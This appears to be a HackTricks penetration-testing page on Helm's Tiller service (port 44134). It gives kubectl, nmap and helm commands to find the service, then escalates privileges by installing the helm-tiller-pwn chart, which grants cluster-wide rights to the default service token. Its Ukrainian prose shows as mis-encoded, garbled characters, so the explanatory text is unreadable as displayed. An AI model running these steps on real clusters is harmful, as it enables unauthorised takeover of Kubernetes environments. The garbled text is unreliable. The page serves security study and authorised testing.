{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Helm —î **–º–µ–Ω–µ–¥–∂–µ—Ä–æ–º –ø–∞–∫–µ—Ç—ñ–≤** –¥–ª—è Kubernetes. –í—ñ–Ω –¥–æ–∑–≤–æ–ª—è—î –ø–∞–∫—É–≤–∞—Ç–∏ YAML —Ñ–∞–π–ª–∏ —Ç–∞ —Ä–æ–∑–ø–æ–≤—Å—é–¥–∂—É–≤–∞—Ç–∏ —ó—Ö —É –ø—É–±–ª—ñ—á–Ω–∏—Ö —ñ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—è—Ö. –¶—ñ –ø–∞–∫–µ—Ç–∏ –Ω–∞–∑–∏–≤–∞—é—Ç—å—Å—è **Helm Charts**. **Tiller** —î **—Å–µ—Ä–≤—ñ—Å–æ–º**, —â–æ **–∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞ –ø–æ—Ä—Ç—É 44134, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ —Ü—é –ø–æ—Å–ª—É–≥—É.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumeration

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –ø–æ–¥–∏ —Ç–∞/–∞–±–æ —Å–µ—Ä–≤—ñ—Å–∏** —Ä—ñ–∑–Ω–∏—Ö –ø—Ä–æ—Å—Ç–æ—Ä–æ–≤–∏—Ö —ñ–º–µ–Ω, –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É–π—Ç–µ —ó—Ö —ñ —à—É–∫–∞–π—Ç–µ —Ç—ñ, —â–æ –º—ñ—Å—Ç—è—Ç—å **"tiller" —É —Å–≤–æ—ó–π –Ω–∞–∑–≤—ñ**:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
–ü—Ä–∏–∫–ª–∞–¥–∏:
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–∞–π—Ç–∏ —Ü—é —Å–ª—É–∂–±—É, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏ –ø–æ—Ä—Ç 44134:
```bash
sudo nmap -sS -p 44134 <IP>
```
–Ø–∫—â–æ –≤–∏ –π–æ–≥–æ –≤–∏—è–≤–∏–ª–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–≤'—è–∑–∞—Ç–∏—Å—è –∑ –Ω–∏–º, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ –∫–ª—ñ—î–Ω—Ç—Å—å–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫ helm. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ `homebrew`, –∞–±–æ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ [**—Å—Ç–æ—Ä—ñ–Ω–∫—É –æ—Ñ—ñ—Ü—ñ–π–Ω–∏—Ö —Ä–µ–ª—ñ–∑—ñ–≤**](https://github.com/helm/helm/releases)**.** –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∞–±–æ —ñ–Ω—à–∏—Ö –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤ –¥–∏–≤—ñ—Ç—å—Å—è [–ø–æ—Å—ñ–±–Ω–∏–∫ –∑ —É—Å—Ç–∞–Ω–æ–≤–∫–∏](https://v2.helm.sh/docs/using\_helm/#installing-helm).

–ü–æ—Ç—ñ–º –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ —Å–µ—Ä–≤—ñ—Å**:
```
helm --host tiller-deploy.kube-system:44134 version
```
## –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ü—Ä–∏–≤—ñ–ª–µ—ó–≤

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º **Helm2** –±—É–≤ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–π —É **–ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω kube-system** –∑ **–≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏**, —Ç–æ–º—É —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Å–µ—Ä–≤—ñ—Å —ñ –º–∞—Ç–∏–º–µ—Ç–µ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, —Ü–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó**.

–í—Å–µ, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑—Ä–æ–±–∏—Ç–∏, —Ü–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–∞–∫–µ—Ç, –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ —Ü—å–æ–≥–æ: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn), —è–∫–∏–π –Ω–∞–¥–∞—Å—Ç—å **–¥–æ—Å—Ç—É–ø –¥–æ –≤—Å—å–æ–≥–æ –≤ —É—Å—å–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ –¥–ª—è —Ç–æ–∫–µ–Ω–∞ —Å–µ—Ä–≤—ñ—Å—É –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
–í [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **–ø–æ—è—Å–Ω–µ–Ω–Ω—è –∞—Ç–∞–∫–∏**, –∞–ª–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É, —è–∫—â–æ –≤–∏ –ø—Ä–æ—á–∏—Ç–∞—î—Ç–µ —Ñ–∞–π–ª–∏ [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) —Ç–∞ [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ _helm-tiller-pwn/pwnchart/templates/_ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ **–≤—Å—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –Ω–∞–¥–∞—é—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ç–æ–∫–µ–Ω—É**.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
